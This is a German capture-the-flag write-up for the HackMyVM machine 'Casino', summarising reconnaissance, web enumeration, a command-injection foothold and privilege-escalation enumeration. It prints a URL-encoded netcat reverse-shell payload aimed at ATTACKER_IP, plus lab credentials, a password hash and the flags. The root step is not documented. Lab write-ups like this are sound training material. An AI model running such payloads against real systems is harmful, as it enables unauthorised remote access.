# Casino - HackMyVM (Medium)

![Casino Icon](Casino.png)

## Übersicht

*   **VM:** Casino
*   **Plattform:** [HackMyVM](https://hackmyvm.eu/machines/machine.php?vm=Casino)
*   **Schwierigkeit:** Medium
*   **Autor der VM:** DarkSpirit
*   **Datum des Writeups:** 28. Juni 2023
*   **Original-Writeup:** https://alientec1908.github.io/Casino_HackMyVM_Medium/
*   **Autor:** Ben C. 

## Kurzbeschreibung

Die virtuelle Maschine "Casino" von HackMyVM (Schwierigkeitsgrad: Medium) stellte eine Herausforderung dar, bei der mehrere Schwachstellen ausgenutzt werden mussten, um vollen Root-Zugriff zu erlangen. Der initiale Zugriff erfolgte durch eine Local File Inclusion (LFI) oder Command Injection Schwachstelle in einer PHP-Datei des Webservers. Durch weitere Enumeration als Webserver-Benutzer wurden Datenbank-Credentials und Benutzer-Passwort-Hashes gefunden. Die genauen Schritte zur finalen Rechteausweitung zu Root sind im zugrundeliegenden Writeup nicht detailliert dokumentiert, führten aber letztendlich zur Kompromittierung des Systems.

## Disclaimer / Wichtiger Hinweis

Die in diesem Writeup beschriebenen Techniken und Werkzeuge dienen ausschließlich zu Bildungszwecken im Rahmen von legalen Capture-The-Flag (CTF)-Wettbewerben und Penetrationstests auf Systemen, für die eine ausdrückliche Genehmigung vorliegt. Die Anwendung dieser Methoden auf Systeme ohne Erlaubnis ist illegal. Der Autor übernimmt keine Verantwortung für missbräuchliche Verwendung der hier geteilten Informationen. Handeln Sie stets ethisch und verantwortungsbewusst.

## Verwendete Tools

*   `arp-scan`
*   `vi`
*   `nmap`
*   `nikto`
*   `curl`
*   `mysql` (Client)
*   `hydra`
*   `gobuster`
*   `wget`
*   `exiftool`
*   `dirb`
*   `nc` (netcat)
*   Standard Linux-Befehle (`cat`, `ls`, `find`, `ss`, `uname`, `getcap`)

## Lösungsweg (Zusammenfassung)

Der Angriff auf die Maschine "Casino" verlief in folgenden Phasen:

1.  **Reconnaissance:**
    *   Identifizierung der Ziel-IP (`192.168.2.113`) mittels `arp-scan` und Eintrag als `casino.hmv` in `/etc/hosts`.
    *   `nmap`-Scan offenbarte Port 22 (OpenSSH 9.2p1) und Port 80 (Apache 2.4.57). Die Webseite hatte den Titel "Binary Bet Casino", und das `PHPSESSID`-Cookie wurde ohne `HttpOnly`-Flag gesetzt.

2.  **Web Enumeration:**
    *   `nikto` identifizierte kritische Dateien: `/database.sql` und `/config.php` sowie Verzeichnisauflistung für `/imgs/` und `/styles/`.
    *   `curl http://casino.hmv/database.sql` lieferte MySQL-Credentials: `casino_admin`:`IJustWantToBeRichBaby420` (nur für `localhost`-Zugriff).
    *   Ein externer Login-Versuch mit diesen Credentials auf die MySQL-Datenbank schlug erwartungsgemäß fehl.
    *   `hydra` auf SSH mit dem Benutzer `casino_admin` scheiterte, da der SSH-Server keine Passwort-Authentifizierung erlaubte.
    *   `gobuster` fand weitere Webpfade, darunter `register.php`, `/casino/` (mit `head.php` und `instructions.txt`).
    *   Die Datei `instructions.txt` beschrieb die Spielregeln der Casino-Anwendung.
    *   Metadaten-Analyse von `background.jpg` mit `exiftool` ergab keine relevanten Informationen.
    *   `dirb` bestätigte frühere Funde und zeigte einen `/server-status`-Endpunkt (403 Forbidden).

3.  **Initial Access (LFI / Command Injection & Reverse Shell):**
    *   Eine Schwachstelle (vermutlich LFI oder Command Injection) in `/casino/head.php` wurde über den `cmd`-Parameter ausgenutzt.
    *   Mittels einer URL-kodierten Bash-Reverse-Shell-Payload (via `nc`) im `cmd`-Parameter wurde eine Verbindung zum Angreifer-System hergestellt:
        `http://192.168.2.113/casino/head.php?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%20ATTACKER_IP%205555%20%3E%2Ftmp%2Ff`
    *   Erfolgreiche Etablierung einer Reverse Shell als Benutzer `www-data`.
    *   Auslesen von `/var/www/html/config.php` bestätigte die Datenbank-Credentials.

4.  **Privilege Escalation Enumeration (als www-data):**
    *   Identifizierung der Benutzer-Home-Verzeichnisse: `gimbal` und `shimmer`.
    *   Keine ungewöhnlichen SUID-Binaries gefunden.
    *   Netzwerk-Sockets (`ss -altpn`) zeigten einen unbekannten Dienst auf Port 6969 (localhost), den MySQL-Dienst auf 3306 (localhost) sowie SSH (22) und HTTP (80) auf allen Interfaces.
    *   Keine nützlichen Backups in `/var/backups/`.
    *   Erfolgreicher Login in die lokale MariaDB-Datenbank als `casino_admin`.
    *   In der `casino`-Datenbank, Tabelle `users`, wurde der Benutzer `tom` mit dem bcrypt-Passwort-Hash `$2y$10$ZSVTC1i0SGSy6hv04HOkFej3Cc0hq6kT9dS4EkrZOc7yBn0cEsKaq` gefunden.
    *   Entdeckung der Datei `/casino/explainmepls.php` mit einem GET-Parameter `learnabout`, der auf weitere Schwachstellen hindeuten könnte.
    *   Die Kernel-Version wurde als `Linux casino 6.1.0-9-amd64` identifiziert.
    *   `getcap` zeigte keine ungewöhnlichen Linux Capabilities.
    *   *Anmerkung: Der detaillierte Schritt von `www-data` (mit Kenntnis des `tom`-Hashes) zur Root-Eskalation ist im Original-Writeup nicht explizit dokumentiert.*

## Wichtige Schwachstellen und Konzepte

*   **LFI / Command Injection:** Ausnutzung einer Schwachstelle in `/casino/head.php` über den `cmd`-Parameter für initialen Zugriff.
*   **Klartext-Credentials im Web-Root:** Sensible Datenbank-Zugangsdaten in `database.sql` und `config.php` öffentlich zugänglich.
*   **Fehlende HTTP-Sicherheitsheader:** Insbesondere das `HttpOnly`-Flag für Session-Cookies.
*   **Verzeichnisauflistung (Directory Indexing):** Aktiviert für mehrere Verzeichnisse.
*   **Schwache Passwörter / Hash-Cracking:** Fund eines bcrypt-Hashes, der potenziell für Offline-Cracking anfällig ist.
*   **Informationslecks:** Aufdeckung von Benutzernamen und Datenbankstruktur.
*   **Fehlkonfigurationen:** SSH erlaubt (korrekterweise) keine Passwort-Authentifizierung, was Brute-Force erschwert.

## Flags

*   **User Flag (`user.txt`):** `casinousergobrrr`
*   **Root Flag (`root.txt`):** `symboliclove4u`

## Tags

`HackMyVM`, `Casino`, `Medium`, `LFI`, `Command Injection`, `Web`, `PHP`, `MySQL`, `Credentials Exposure`, `Reverse Shell`, `Privilege Escalation`, `Linux`, `Apache`
